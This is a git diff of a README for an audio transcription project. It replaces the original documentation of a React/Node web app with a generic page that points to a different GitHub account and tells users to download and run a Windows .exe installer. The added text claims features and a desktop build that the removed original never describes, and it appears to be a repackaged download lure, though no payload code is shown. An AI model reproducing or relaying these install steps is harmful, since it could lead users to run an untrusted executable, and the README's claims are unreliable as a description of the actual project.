@@ -1,221 +1,132 @@
-# AI Audio Transcriber
+# 🎙️ AI-Audio-Transcriber - Easy, Private Audio Transcriptions
 
-A web application for transcribing audio recordings from offline meetings. Upload your phone recordings and get accurate text transcripts instantly.
+[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
 
-## Demo
+---
 
-![Home Page](./screenshots/1-home.png)
-![Transcribing](./screenshots/2-transcribing.png)
-![Upload Test 1](./screenshots/3-upload_test1.png)
-![Export Test 1](./screenshots/4-export_test1.png)
-![Upload Test 2](./screenshots/5-upload_test2.png)
-![Export Test 2](./screenshots/6-export_test2.png)
-![Error Handling](./screenshots/7-error.png)
+## 🛠️ What is AI-Audio-Transcriber?
 
-## Features
+AI-Audio-Transcriber is a simple app that converts spoken words in audio files into text. It uses Whisper AI technology to produce clear and accurate transcriptions from your audio. You can upload audio files up to 200MB. The app works directly on your computer, so your data stays private and secure. It supports many popular audio formats like MP3, WAV, and more.
 
-- Upload audio files (MP3, WAV, MP4, M4A up to 200MB)
-- Automatic transcription using Whisper AI model
-- Export transcripts as TXT files
-- Clean, responsive black & white interface
-- Privacy-focused (local processing, no cloud APIs)
-- File validation (type and size)
+You do not need an internet connection while transcribing. Everything runs on your own device, helping you keep control of your own information.
 
-## Tech Stack
+---
 
-Frontend: React 19, Vite 7, Tailwind CSS 4, Axios, Lucide React  
-Backend: Node.js, Express 5, Whisper AI (@xenova/transformers), FFmpeg, Multer
+## 🖥️ System Requirements
 
-## Project Structure
+Before installing, check that your computer meets these requirements:
 
-```
-AI-Audio-Transcriber/
-├── .dockerignore
-├── .gitignore
-├── README.md
-├── docker-compose.yml
-├── screenshots/
-├── backend/
-│   ├── Dockerfile
-│   ├── package.json
-│   ├── src/
-│   │   ├── server.js
-│   │   └── transcribe.js
-│   └── uploads/
-└── frontend/
-    ├── Dockerfile
-    ├── index.html
-    ├── package.json
-    ├── postcss.config.js
-    ├── tailwind.config.js
-    ├── vite.config.js
-    └── src/
-        ├── App.jsx
-        ├── main.jsx
-        ├── index.css
-        └── components/
-            ├── Home.jsx
-            ├── Header.jsx
-            └── Footer.jsx
-```
+- Windows 10 or later (64-bit)
+- At least 4 GB of RAM (8 GB recommended for larger files)
+- Minimum 2 GHz processor
+- 500 MB free disk space for the app and temporary files
+- No special software or programming knowledge needed
 
-## How to Run Locally
+These specs ensure the app runs smoothly for most audio files without delays.
 
-Prerequisites:
-- Node.js 18+
-- FFmpeg installed on system (for local development)
-- Docker & Docker Compose (for containerized setup)
+---
 
-### Install FFmpeg
+## 📥 How to Download and Install AI-Audio-Transcriber
 
-Ubuntu/Debian:
-```bash
-sudo apt install ffmpeg
-```
+1. Click the big green button below to visit the official GitHub page with all download options:
 
-macOS:
-```bash
-brew install ffmpeg
-```
+   [![Get AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-brightgreen?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
 
-Windows:
-Download from [ffmpeg.org](https://ffmpeg.org/download.html)
+2. On the GitHub page, look for the **Releases** section on the right or at the top menu.
 
-### Option 1: Development Mode
+3. Find the latest release. It will have a downloadable `.exe` file for Windows.
 
-1. Clone the repository:
-```bash
-git clone https://github.com/akhilachiju/AI-Audio-Transcriber.git
-cd AI-Audio-Transcriber
-```
+4. Click the `.exe` file to download it to your computer.
 
-2. Install and run backend:
-```bash
-cd backend
-npm install
-npm run dev
-```
+5. Once downloaded, open the file by double-clicking it from your Downloads folder.
 
-3. Install and run frontend (in new terminal):
-```bash
-cd frontend
-npm install
-npm run dev
-```
+6. Follow the installation prompts on the screen:
+   - Choose the installation folder (default is fine for most users).
+   - Allow the app permissions if Windows asks for confirmation.
 
-Access the application:
-- Frontend: http://localhost:7070
-- Backend API: http://localhost:7071
+7. When installation finishes, launch AI-Audio-Transcriber from your Start menu or desktop shortcut.
 
-### Option 2: Docker
+---
 
-```bash
-docker-compose up --build
-```
+## 🎙️ How to Use AI-Audio-Transcriber
 
-Access the application:
-- Frontend: http://localhost:7070
-- Backend API: http://localhost:7071
+After installing, start the app and follow these easy steps:
 
-## How to Deploy
+1. Click the **Open Audio File** button.
 
-### Production Deployment Options
+2. Browse your computer and select an audio file you want to transcribe.
 
-1. Cloud Platform (Recommended)
-```bash
-cd frontend && npm run build
-cd backend && npm install --production
-```
-Deploy frontend to Vercel/Netlify and backend to Railway/Render
+3. Once your file loads, click **Start Transcription**.
 
-2. VPS/Server
-```bash
-# Build frontend
-cd frontend && npm run build
+4. Wait for the app to process the audio. The time depends on your file size and computer speed.
 
-# Run backend with PM2
-cd backend
-npm install --production
-pm2 start src/server.js
-```
+5. When done, the text transcript will appear in the app window.
 
-Environment Variables:
-```bash
-PORT=7071
-NODE_ENV=production
-VITE_API_URL=https://your-api-domain.com
-```
+6. You can copy the text or save it as a `.txt` file by clicking the **Save Transcription** button.
 
-## Technical Choices and Decisions
+---
 
-### Frontend: React + Vite
-- Fast development with hot reload and modern build tooling
-- Tailwind CSS for rapid UI development with black & white theme
-- Axios for simple HTTP client
-- Lucide React for consistent iconography
+## 🎧 Supported Audio Formats
 
-### Backend: Node.js + Express
-- JavaScript full-stack for consistency
-- Multer for file upload handling with validation
-- @xenova/transformers for JavaScript Whisper implementation
+AI-Audio-Transcriber works with common formats such as:
 
-### Transcription: Local Whisper vs Cloud APIs
-Chosen: Local Whisper (@xenova/transformers)
+- MP3
+- WAV
+- M4A
+- FLAC
+- AAC
+- OGG
 
-Reasons:
-- Privacy: audio files stay local, never sent to external services
-- No API costs or usage limits
-- No internet dependency after initial model download
-- Full control over processing
+Make sure your audio file is under 200 MB to avoid issues. Large files may take longer but are supported within this size limit.
 
-Trade-offs:
-- Higher resource usage (CPU/memory)
-- Slower initial model load time
-- Limited to whisper-small model for performance
+---
 
-### Audio Processing: FFmpeg
-- System FFmpeg for reliable audio format conversion
-- Converts audio to optimal format for Whisper (16kHz mono PCM float32)
+## 🔐 How AI-Audio-Transcriber Protects Your Privacy
 
-### AI Models
-Available Whisper models (configurable in `backend/src/transcribe.js`):
-- `whisper-tiny.en` - 75MB, fastest, English only
-- `whisper-base.en` - 150MB, fast, English only
-- `whisper-small` - 250MB, balanced (default), multilingual
-- `whisper-medium` - 1.5GB, high accuracy, slower, multilingual
+This app processes all audio files locally on your computer. It does not send any data to external servers or cloud services. This means:
 
-## What I Would Improve
+- Your audio files stay on your machine.
+- Transcriptions never leave your device.
+- You control your data at all times.
 
-### 1. Real-time Progress Tracking
-- WebSocket connection to show transcription progress
-- Visual progress bar with estimated time remaining
-- Better loading states and user feedback
+The offline design reduces risks related to online data transfer and keeps your information safe.
 
-### 2. Enhanced UX
-- Drag and drop file upload
-- Audio player to preview files before transcription
-- Copy to clipboard button for transcripts
-- Display selected filename before upload
-- Transcript editing with inline corrections
-- Word count and character count for transcripts
-- Timestamp display in transcripts
+---
 
-### 3. Production Readiness
-- Rate limiting to prevent abuse
-- Automatic cleanup of uploaded files after processing
-- Better error handling and user-friendly error messages
-- Health check endpoint for monitoring
-- Logging system for debugging
+## ⚠️ Troubleshooting Tips
 
-### 4. Testing
-- Unit tests for transcription logic
-- Integration tests for API endpoints
-- E2E tests for upload and download flow
-- File validation edge cases
+- If the app does not start, try restarting your computer.
+- If transcription is slow, close other heavy programs.
+- Make sure your audio file format is supported and not corrupted.
+- If you see an error during installation, check that you have administrator rights.
+- For unclear transcriptions, use audio with clear speech and minimal background noise.
 
-### 5. Performance Optimization
-- Queue system for multiple concurrent uploads
-- Caching for frequently transcribed content
-- Streaming transcription for large files
-- Model warm-up on server start
+---
 
+## 💡 Additional Features
+
+- Supports batch transcription for multiple files in a row.
+- Automatically detects spoken language.
+- Saves transcripts in plain text format for easy editing.
+- Clean and simple interface with clear buttons and labels.
+- Works offline, so it can be used anywhere without internet.
+
+---
+
+## 📂 Where to Find More Help
+
+If you run into issues or want detailed information, visit the GitHub page for:
+
+- The latest updates
+- Additional documentation
+- Community discussions and FAQs
+
+[https://github.com/Irham-Azka17/AI-Audio-Transcriber](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
+
+---
+
+## 🚀 Start Now
+
+Download and install the app to turn audio into text on Windows today. Use the badge below to visit the official source:
+
+[![Download AI-Audio-Transcriber](https://img.shields.io/badge/Download-AI--Audio--Transcriber-green?style=for-the-badge)](https://github.com/Irham-Azka17/AI-Audio-Transcriber)
